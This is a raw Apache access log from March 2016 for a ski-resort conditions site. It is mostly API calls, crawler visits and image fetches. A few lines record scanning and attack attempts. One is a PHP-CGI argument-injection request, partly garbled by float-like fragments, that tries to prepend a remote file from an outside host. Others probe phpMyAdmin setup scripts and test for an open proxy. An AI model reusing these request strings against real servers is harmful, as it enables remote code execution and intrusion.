52.33.40.213 - - [21/Mar/2016:06:47:36 -0700] "GET /lib/reccapi.php?resort=buttermilk HTTP/1.1" 200 969 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:06:49:56 -0700] "GET /lib/reccapi.php?resort=redlodge HTTP/1.1" 200 1090 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:06:50:00 -0700] "GET /lib/reccapi.php?resort=diamondpeak HTTP/1.1" 200 1055 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:06:50:00 -0700] "GET /lib/reccapi.php?resort=heavenly HTTP/1.1" 200 1073 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:06:50:00 -0700] "GET /lib/reccapi.php?resort=mtrose HTTP/1.1" 200 1079 "-" "node-superagent/1.4.0"
157.55.39.89 - - [21/Mar/2016:06:51:16 -0700] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
170.75.162.130 - - [21/Mar/2016:06:52:51 -0700] "GET /lib/reccapi.php?resort=mountspokane HTTP/1.1" 200 1094 "-" "node-superagent/1.4.0"
66.249.79.248 - - [21/Mar/2016:07:02:42 -0700] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [21/Mar/2016:07:03:52 -0700] "GET /lib/reccapi.php?resort=49degreesnorth HTTP/1.1" 200 1087 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:07:19:54 -0700] "GET /lib/reccapi.php?resort=alta HTTP/1.1" 200 965 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:07:19:54 -0700] "GET /lib/reccapi.php?resort=alyeska HTTP/1.1" 200 1051 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:07:20:04 -0700] "GET /lib/reccapi.php?resort=brianhead HTTP/1.1" 200 993 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:07:20:04 -0700] "GET /lib/reccapi.php?resort=chinapeak HTTP/1.1" 200 1023 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:07:20:04 -0700] "GET /lib/reccapi.php?resort=deervalley HTTP/1.1" 200 1001 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:07:20:14 -0700] "GET /lib/reccapi.php?resort=jacksonhole HTTP/1.1" 200 1081 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:07:20:24 -0700] "GET /lib/reccapi.php?resort=madriverglen HTTP/1.1" 200 1036 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:07:20:24 -0700] "GET /lib/reccapi.php?resort=mammothmountain HTTP/1.1" 200 1076 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:07:24:38 -0700] "GET /lib/reccapi.php?resort=bigsky HTTP/1.1" 200 1054 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:07:24:48 -0700] "GET /lib/reccapi.php?resort=jaypeak HTTP/1.1" 200 1029 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:07:25:04 -0700] "GET /lib/reccapi.php?resort=sunvalley HTTP/1.1" 200 1045 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:07:27:24 -0700] "GET /lib/reccapi.php?resort=snowbasin HTTP/1.1" 200 1076 "-" "node-superagent/1.4.0"
180.76.15.11 - - [21/Mar/2016:07:29:15 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.11 - - [21/Mar/2016:07:30:07 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
52.33.40.213 - - [21/Mar/2016:07:32:18 -0700] "GET /lib/reccapi.php?resort=parkcity HTTP/1.1" 200 1031 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:07:32:38 -0700] "GET /lib/reccapi.php?resort=cannonmountain HTTP/1.1" 200 1054 "-" "node-superagent/1.4.0"
89.248.160.229 - - [21/Mar/2016:07:33:09 -0700] "GET /cgi-bin/php5?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin8.313680E-316simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D\"\"+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp0X0.000000171B6AP-10220.0000000.00000089.248.160.1320.000000ok.txt+-d+cgi2.322109E-322force_redirect%3D0+-d+cgi9.010298E-316redirect_status_env%3D0+-n HTTP/1.1" 404 473 "-" "-"
170.75.162.130 - - [21/Mar/2016:07:33:45 -0700] "GET /lib/reccapi.php?resort=whitefacemountain HTTP/1.1" 200 1022 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:07:34:18 -0700] "GET /lib/reccapi.php?resort=squawvalleyusa HTTP/1.1" 200 1051 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:07:40:25 -0700] "GET /lib/reccapi.php?resort=parkcity HTTP/1.1" 200 1031 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:07:40:26 -0700] "GET /lib/reccapi.php?resort=solitude HTTP/1.1" 200 967 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:07:40:26 -0700] "GET /lib/reccapi.php?resort=snowbird HTTP/1.1" 200 982 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:07:48:49 -0700] "GET /lib/reccapi.php?resort=telluride HTTP/1.1" 200 976 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:07:48:59 -0700] "GET /lib/reccapi.php?resort=solitude HTTP/1.1" 200 967 "-" "node-superagent/1.4.0"
185.25.151.159 - - [21/Mar/2016:07:55:42 -0700] "GET http://testp5.mielno.lubin.pl/testproxy.php HTTP/1.1" 404 452 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
180.76.15.163 - - [21/Mar/2016:08:00:36 -0700] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
47.208.168.64 - - [21/Mar/2016:08:02:47 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4"
40.114.43.252 - - [21/Mar/2016:08:02:50 -0700] "GET /muieblackcat HTTP/1.1" 404 466 "-" "-"
40.114.43.252 - - [21/Mar/2016:08:02:50 -0700] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 466 "-" "-"
40.114.43.252 - - [21/Mar/2016:08:02:50 -0700] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 466 "-" "-"
40.114.43.252 - - [21/Mar/2016:08:02:50 -0700] "GET //pma/scripts/setup.php HTTP/1.1" 404 466 "-" "-"
40.114.43.252 - - [21/Mar/2016:08:02:50 -0700] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 466 "-" "-"
40.114.43.252 - - [21/Mar/2016:08:02:51 -0700] "GET //MyAdmin/scripts/setup.php HTTP/1.1" 404 466 "-" "-"
127.0.0.1 - - [21/Mar/2016:08:02:53 -0700] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.2.22 (Ubuntu) (internal dummy connection)"
52.33.40.213 - - [21/Mar/2016:08:03:09 -0700] "GET /lib/reccapi.php?resort=brighton HTTP/1.1" 200 974 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:08:05:10 -0700] "GET /lib/reccapi.php?resort=steamboat HTTP/1.1" 200 994 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:08:09:48 -0700] "GET /lib/reccapi.php?resort=jaypeak HTTP/1.1" 200 1029 "-" "node-superagent/1.4.0"
71.93.74.29 - - [21/Mar/2016:08:11:26 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
162.227.136.194 - - [21/Mar/2016:08:25:59 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
66.25.187.55 - - [21/Mar/2016:08:26:26 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0"
180.76.15.22 - - [21/Mar/2016:08:31:51 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.8 - - [21/Mar/2016:08:32:48 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
70.213.12.20 - - [21/Mar/2016:08:40:51 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
170.75.162.130 - - [21/Mar/2016:08:51:41 -0700] "GET /lib/reccapi.php?resort=sugarloaf HTTP/1.1" 200 1061 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:08:52:51 -0700] "GET /lib/reccapi.php?resort=stevenspass HTTP/1.1" 200 1065 "-" "node-superagent/1.4.0"
66.249.79.248 - - [21/Mar/2016:08:56:12 -0700] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=boyne&dateStart=2016-02-23 HTTP/1.1" 200 859 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [21/Mar/2016:08:59:12 -0700] "GET /lib/reccapi.php?resort=sierra-at-tahoe HTTP/1.1" 200 1117 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:09:04:42 -0700] "GET /lib/reccapi.php?resort=whistlerblackcomb HTTP/1.1" 200 931 "-" "node-superagent/1.4.0"
66.249.79.135 - - [21/Mar/2016:09:11:43 -0700] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [21/Mar/2016:09:15:33 -0700] "GET /lib/reccapi.php?resort=northstar-at-tahoe HTTP/1.1" 200 1062 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:09:18:33 -0700] "GET /lib/reccapi.php?resort=bigsky HTTP/1.1" 200 1054 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:09:18:33 -0700] "GET /lib/reccapi.php?resort=cannonmountain HTTP/1.1" 200 1054 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:09:18:33 -0700] "GET /lib/reccapi.php?resort=bigwhite HTTP/1.1" 200 921 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:09:19:23 -0700] "GET /lib/reccapi.php?resort=mountbachelor HTTP/1.1" 200 1069 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:09:19:23 -0700] "GET /lib/reccapi.php?resort=mountainhigh HTTP/1.1" 200 1001 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:09:19:23 -0700] "GET /lib/reccapi.php?resort=schweitzer HTTP/1.1" 200 1056 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:09:19:23 -0700] "GET /lib/reccapi.php?resort=grandtarghee HTTP/1.1" 200 1108 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:09:19:33 -0700] "GET /lib/reccapi.php?resort=wildcatmountain HTTP/1.1" 200 1040 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:09:20:16 -0700] "GET /lib/reccapi.php?resort=redmountain HTTP/1.1" 200 907 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:09:20:24 -0700] "GET /lib/reccapi.php?resort=silverstarmountain HTTP/1.1" 200 928 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:09:20:44 -0700] "GET /lib/reccapi.php?resort=sunpeaksresort HTTP/1.1" 200 917 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:09:21:04 -0700] "GET /lib/reccapi.php?resort=redlodge HTTP/1.1" 200 1094 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:09:21:23 -0700] "GET /lib/reccapi.php?resort=arapahoebasin HTTP/1.1" 200 1006 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:09:21:43 -0700] "GET /lib/reccapi.php?resort=coppermountain HTTP/1.1" 200 997 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:09:25:03 -0700] "GET /lib/reccapi.php?resort=alta HTTP/1.1" 200 965 "-" "node-superagent/1.4.0"
51.255.66.181 - - [21/Mar/2016:09:28:09 -0700] "GET /images/forecasts/OR-20121213.png HTTP/1.1" 404 467 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
66.249.79.135 - - [21/Mar/2016:09:28:35 -0700] "GET /lib/reccapi.php?resort=brighton&date=2016-03-23 HTTP/1.1" 200 1114 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.135 - - [21/Mar/2016:09:28:36 -0700] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=brighton&dateStart=2016-03-21 HTTP/1.1" 200 795 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.241 - - [21/Mar/2016:09:28:37 -0700] "GET /lib/reccapi.php?fields=t&date=2016-03-23&coords=40.58%2C-111.58&size=7&sort=distance HTTP/1.1" 200 1323 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
52.33.40.213 - - [21/Mar/2016:09:30:43 -0700] "GET /lib/reccapi.php?resort=aspenmountain HTTP/1.1" 200 985 "-" "node-superagent/1.4.0"
5.9.151.67 - - [21/Mar/2016:09:31:47 -0700] "GET / HTTP/1.1" 200 2559 "-" "Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http://megaindex.com/crawler)"
5.9.151.67 - - [21/Mar/2016:09:31:49 -0700] "GET /robots.txt HTTP/1.1" 200 363 "-" "Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http://megaindex.com/crawler)"
5.9.151.67 - - [21/Mar/2016:09:31:50 -0700] "GET /about HTTP/1.1" 404 450 "-" "Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http://megaindex.com/crawler)"
52.33.40.213 - - [21/Mar/2016:09:32:23 -0700] "GET /lib/reccapi.php?resort=brianhead HTTP/1.1" 200 993 "-" "node-superagent/1.4.0"
180.76.15.162 - - [21/Mar/2016:09:33:32 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.16 - - [21/Mar/2016:09:34:30 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
71.94.68.231 - - [21/Mar/2016:09:38:06 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1"
52.33.40.213 - - [21/Mar/2016:09:39:34 -0700] "GET /lib/reccapi.php?resort=sugarbowl HTTP/1.1" 200 1056 "-" "node-superagent/1.4.0"
108.11.9.166 - - [21/Mar/2016:09:43:25 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
208.100.26.231 - - [21/Mar/2016:09:45:58 -0700] "GET / HTTP/1.0" 200 6995 "-" "-"
208.100.26.231 - - [21/Mar/2016:09:46:18 -0700] "HEAD / HTTP/1.1" 200 310 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)"
180.76.15.14 - - [21/Mar/2016:09:49:01 -0700] "GET /about HTTP/1.1" 404 472 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
199.48.105.34 - - [21/Mar/2016:10:15:23 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"
52.33.40.213 - - [21/Mar/2016:10:15:45 -0700] "GET /lib/reccapi.php?resort=taos HTTP/1.1" 200 966 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:10:15:45 -0700] "GET /lib/reccapi.php?resort=sunvalley HTTP/1.1" 200 1045 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:10:15:45 -0700] "GET /lib/reccapi.php?resort=jacksonhole HTTP/1.1" 200 1081 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:10:15:45 -0700] "GET /lib/reccapi.php?resort=grandtarghee HTTP/1.1" 200 1108 "-" "node-superagent/1.4.0"
75.37.8.212 - - [21/Mar/2016:10:15:55 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/537.86.4"
24.32.24.62 - - [21/Mar/2016:10:22:18 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
52.33.40.213 - - [21/Mar/2016:10:22:46 -0700] "GET /lib/reccapi.php?resort=keystone HTTP/1.1" 200 995 "-" "node-superagent/1.4.0"
180.76.15.11 - - [21/Mar/2016:10:30:08 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.143 - - [21/Mar/2016:10:30:58 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
52.33.40.213 - - [21/Mar/2016:10:31:56 -0700] "GET /lib/reccapi.php?resort=sundayriver HTTP/1.1" 200 1032 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:10:41:40 -0700] "GET /lib/reccapi.php?resort=sugarbush HTTP/1.1" 200 1012 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:10:41:40 -0700] "GET /lib/reccapi.php?resort=smugglersnotch HTTP/1.1" 200 1000 "-" "node-superagent/1.4.0"
50.174.40.248 - - [21/Mar/2016:10:47:20 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
170.75.162.130 - - [21/Mar/2016:10:49:21 -0700] "GET /lib/reccapi.php?resort=winterpark HTTP/1.1" 200 989 "-" "node-superagent/1.4.0"
170.75.162.130 - - [21/Mar/2016:10:49:21 -0700] "GET /lib/reccapi.php?resort=telluride HTTP/1.1" 200 976 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:10:57:28 -0700] "GET /lib/reccapi.php?resort=heavenly HTTP/1.1" 200 1072 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:10:57:28 -0700] "GET /lib/reccapi.php?resort=kirkwood HTTP/1.1" 200 1128 "-" "node-superagent/1.4.0"
66.249.74.58 - - [21/Mar/2016:11:01:02 -0700] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
50.174.40.248 - - [21/Mar/2016:11:03:49 -0700] "-" 408 0 "-" "-"
50.174.40.248 - - [21/Mar/2016:11:03:49 -0700] "-" 408 0 "-" "-"
50.174.40.248 - - [21/Mar/2016:11:03:50 -0700] "-" 408 0 "-" "-"
66.237.49.124 - - [21/Mar/2016:11:11:49 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
66.249.79.227 - - [21/Mar/2016:11:16:30 -0700] "GET /lib/reccapi.php?fields=t&date=2016-03-08&coords=37.63%2C-119.02&size=7&sort=distance HTTP/1.1" 200 1407 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.227 - - [21/Mar/2016:11:16:31 -0700] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=mammothmountain&dateStart=2016-03-06 HTTP/1.1" 200 874 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
75.108.20.254 - - [21/Mar/2016:11:27:40 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
66.249.79.234 - - [21/Mar/2016:11:28:23 -0700] "GET /lib/reccapi.php?resort=bearvalleymountain&date=2016-02-18 HTTP/1.1" 200 1123 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.234 - - [21/Mar/2016:11:28:24 -0700] "GET /lib/reccapi.php?fields=t&date=2016-02-18&coords=38.5%2C-120.06&size=7&sort=distance HTTP/1.1" 200 1367 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.227 - - [21/Mar/2016:11:28:25 -0700] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=bearvalleymountain&dateStart=2016-02-16 HTTP/1.1" 200 871 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
52.33.40.213 - - [21/Mar/2016:11:28:49 -0700] "GET /lib/reccapi.php?resort=mammothmountain HTTP/1.1" 200 1076 "-" "node-superagent/1.4.0"
108.80.57.174 - - [21/Mar/2016:11:29:02 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (X11; CrOS x86_64 7834.60.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.95 Safari/537.36"
108.80.57.174 - - [21/Mar/2016:11:29:24 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [21/Mar/2016:11:29:24 -0700] "GET /lib/reccapi.php?resort=steamboat HTTP/1.1" 200 994 "-" "node-superagent/1.4.0"
180.76.15.140 - - [21/Mar/2016:11:32:12 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.34 - - [21/Mar/2016:11:33:06 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
47.208.180.96 - - [21/Mar/2016:11:38:07 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
52.33.40.213 - - [21/Mar/2016:11:49:40 -0700] "GET /lib/reccapi.php?resort=aspenheights HTTP/1.1" 200 992 "-" "node-superagent/1.4.0"
66.249.79.227 - - [21/Mar/2016:11:51:49 -0700] "GET /lib/reccapi.php?fields=t HTTP/1.1" 200 1963 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [21/Mar/2016:11:52:26 -0700] "GET /lib/reccapi.php?resort=parkcity HTTP/1.1" 200 1031 "-" "node-superagent/1.4.0"
66.249.79.227 - - [21/Mar/2016:11:55:22 -0700] "GET /lib/reccapi.php?resort=crestedbutte&date=2016-03-17 HTTP/1.1" 200 1075 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.227 - - [21/Mar/2016:11:55:23 -0700] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=crestedbutte&dateStart=2016-03-15 HTTP/1.1" 200 873 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.220 - - [21/Mar/2016:11:55:24 -0700] "GET /lib/reccapi.php?fields=t&date=2016-03-17&coords=38.9%2C-106.94&size=7&sort=distance HTTP/1.1" 200 1342 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.234 - - [21/Mar/2016:11:58:34 -0700] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=bearvalleymountain&dateStart=2016-03-04 HTTP/1.1" 200 868 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.25 - - [21/Mar/2016:12:04:12 -0700] "GET /resorts?resort=alyeska HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
52.33.40.213 - - [21/Mar/2016:12:12:41 -0700] "GET /lib/reccapi.php?resort=northstar-at-tahoe HTTP/1.1" 200 1062 "-" "node-superagent/1.4.0"
50.197.90.97 - - [21/Mar/2016:12:18:18 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
66.249.79.227 - - [21/Mar/2016:12:21:29 -0700] "GET /robots.txt HTTP/1.1" 200 419 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.227 - - [21/Mar/2016:12:21:29 -0700] "GET /lib/reccapi.php?resort=sundayriver&date=2016-01-01 HTTP/1.1" 200 709 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.89 - - [21/Mar/2016:12:23:21 -0700] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
108.80.57.174 - - [21/Mar/2016:12:23:54 -0700] "-" 408 0 "-" "-"
108.80.57.174 - - [21/Mar/2016:12:23:54 -0700] "-" 408 0 "-" "-"
108.80.57.174 - - [21/Mar/2016:12:23:54 -0700] "-" 408 0 "-" "-"
52.33.40.213 - - [21/Mar/2016:12:25:52 -0700] "GET /lib/reccapi.php?resort=stowe HTTP/1.1" 200 988 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:12:26:02 -0700] "GET /lib/reccapi.php?resort=sugarbush HTTP/1.1" 200 1012 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:12:26:02 -0700] "GET /lib/reccapi.php?resort=whistlerblackcomb HTTP/1.1" 200 931 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:12:26:02 -0700] "GET /lib/reccapi.php?resort=sugarloaf HTTP/1.1" 200 1061 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:12:26:02 -0700] "GET /lib/reccapi.php?resort=winterpark HTTP/1.1" 200 989 "-" "node-superagent/1.4.0"
52.33.40.213 - - [21/Mar/2016:12:26:02 -0700] "GET /lib/reccapi.php?resort=madriverglen HTTP/1.1" 200 1036 "-" "node-superagent/1.4.0"
66.249.79.220 - - [21/Mar/2016:12:27:15 -0700] "GET /lib/reccapi.php?resort=marquette&date=2016-03-24 HTTP/1.1" 200 990 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
